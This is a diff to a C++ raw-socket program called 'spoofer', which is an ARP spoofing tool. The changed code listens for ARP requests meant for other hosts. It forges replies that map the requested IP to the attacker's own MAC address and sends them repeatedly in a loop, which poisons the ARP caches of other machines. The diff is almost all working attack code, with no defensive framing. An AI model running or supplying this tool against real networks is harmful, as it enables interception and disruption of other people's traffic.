@@ -14,6 +14,7 @@
 #include <csignal>
 #include <cstring>
 #include <iostream>
+#include <iomanip>
 #include <mutex>
 #include <thread>
 
@@ -30,8 +31,20 @@ void SIGINTHandler(int);
 std::mutex runMutex;
 int run = 1;
 
-void attack(int socket, int ivalue, const Arp reply)
+void attack(int socket, int ivalue, BYTE* intMac, const Arp arp)
 {
+  Arp reply = arp;
+  reply.operation = 2;
+
+  memcpy(reply.targetHAddr, reply.senderHAddr, HLEN);
+  memcpy(reply.senderHAddr, intMac, HLEN);
+
+  BYTE ipSwap[PLEN];
+
+  memcpy(ipSwap, reply.targetPAddr, PLEN);
+  memcpy(reply.targetPAddr, reply.senderPAddr, PLEN);
+  memcpy(reply.senderPAddr, ipSwap, PLEN);
+
   Ethernet ethernet;
   memcpy(ethernet.destination, reply.targetHAddr, HLEN);
   memcpy(ethernet.source, reply.senderHAddr, HLEN);
@@ -40,9 +53,12 @@ void attack(int socket, int ivalue, const Arp reply)
   int size = 0;
   BYTE buff[BUFFSIZE];
   size += ethernet.ToBuffer(&buff[0]);
-  size += reply.ToBuffer(&buff[15]);
+  size += reply.ToBuffer(&buff[14]);
 
-  std::cout << red << "Hello from thread ATTACK!" << reset << std::endl;
+  std::cout << "Mounting ARP Reply...";
+  ok();
+
+  std::cout << std::endl;
   std::cout << ethernet.ToString() << std::endl;
   std::cout << reply.ToString() << std::endl;
 
@@ -50,9 +66,12 @@ void attack(int socket, int ivalue, const Arp reply)
   destAddr.sll_family = htons(PF_PACKET);
   destAddr.sll_protocol = htons(ETH_P_ALL);
   destAddr.sll_halen = HLEN;
-  destAddr.sll_ifindex = ivalue;
+  destAddr.sll_ifindex = 3;
   memcpy(&(destAddr.sll_addr), ethernet.destination, HLEN);
-  
+
+  std::cout << green << "Engaging attack!" << std::endl;
+ 
+  int count = 0;
   while (run)
   {
     runMutex.lock();
@@ -61,47 +80,17 @@ void attack(int socket, int ivalue, const Arp reply)
 			error();
 			return;
     }
+    count++;
+    std::this_thread::sleep_for(std::chrono::milliseconds(100));
     runMutex.unlock();
   }
+
+  std::cout << "Finish attacking thread (" << (int)count << " packets sent)...";
+  ok();
 }
 
 int main(int argc, char** argv)
 {
-  /*BYTE xxx[HLEN] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05 };
-  BYTE yyy[HLEN] = { 0x10, 0x11, 0x12, 0x13, 0x14, 0x15 };
-  BYTE www[PLEN] = { 0xFF, 0xFE, 0xFD, 0xFC };
-  BYTE zzz[PLEN] = { 0xAA, 0xAB, 0xAC, 0xAD };
-
-  Ethernet ethernet;
-  memcpy(&ethernet.destination, &xxx, HLEN);
-  memcpy(&ethernet.source, &yyy, HLEN);
-  ethernet.etherType = 0x0806;
-
-  Arp arpx;
-  arpx.hType = 0x0102;
-  arpx.pType = 0x0304;
-  arpx.hLen  = 0x5;
-  arpx.pLen = 0x06;
-  arpx.operation = 0x0708;
-  memcpy(&arpx.senderHAddr, &xxx, HLEN);
-  memcpy(&arpx.senderPAddr, &www, PLEN);
-  memcpy(&arpx.targetHAddr, &yyy, HLEN);
-  memcpy(&arpx.targetPAddr, &zzz, PLEN);
-
-  std::cout << ethernet.ToString() << std::endl << arpx.ToString() << std::endl;
-
-  int size = 0;
-  BYTE buffx[BUFFSIZE];
-  size += ethernet.ToBuffer(&buffx[0]);
-  size += arpx.ToBuffer(&buffx[size]);
-
-  for (int i = 0; i < size; i++)
-  {
-    std::cout << "[" << std::hex << (int)buffx[i] << "]";
-  }
-
-  std::cout << std::endl;*/
-
   if (argc != 2)
   {
     std::cerr << "Usage: spoofer <interface>" << std::endl;
@@ -191,7 +180,8 @@ int main(int argc, char** argv)
   }
 
   ok();
-  std::cout << std::endl << blue << "Capturing interface " << ifr.ifr_name << " (" << MACToStr(intMac) << " :: " << IPToStr(intIp) << ")..." << reset << std::endl;
+  std::cout << "Start listen for ARP Request on " << ifr.ifr_name << " (" << MACToStr(intMac) << " " << IPToStr(intIp) << ")...";
+  ok();
  
 	BYTE buff[BUFFSIZE];
 
@@ -205,23 +195,11 @@ int main(int argc, char** argv)
     {
       Arp arp(&buff[14]);
 
-      //if (arp.operation == 1 && !CompareIP(arp.targetPAddr, intIp))
+      if (arp.operation == 1 && !CompareIP(arp.targetPAddr, intIp))
       {
-        std::cout << blue << "Received ARP Request:" << reset << std::endl << arp.ToString() << std::endl;
+        std::cout << std::endl << arp.ToString() << std::endl;
 
-        Arp reply = arp;
-        reply.operation = 2;
-
-        memcpy(reply.targetHAddr, reply.senderHAddr, HLEN);
-        memcpy(reply.senderHAddr, intMac, HLEN);
-
-        BYTE ipSwap[PLEN];
-
-        memcpy(ipSwap, reply.targetPAddr, PLEN);
-        memcpy(reply.targetPAddr, reply.senderPAddr, PLEN);
-        memcpy(reply.senderPAddr, ipSwap, PLEN);
-
-        attackThread = new std::thread(attack, sockd, ifr.ifr_ifindex, reply);
+        attackThread = new std::thread(attack, sockd, ifr.ifr_ifindex, intMac, arp);
         break;
       }
     }
@@ -229,7 +207,6 @@ int main(int argc, char** argv)
 
   if (attackThread != nullptr)
   {
-    std::cout << yellow << "Waiting for attack thread to terminate..." << reset << std::endl;
     attackThread->join();
   }
 
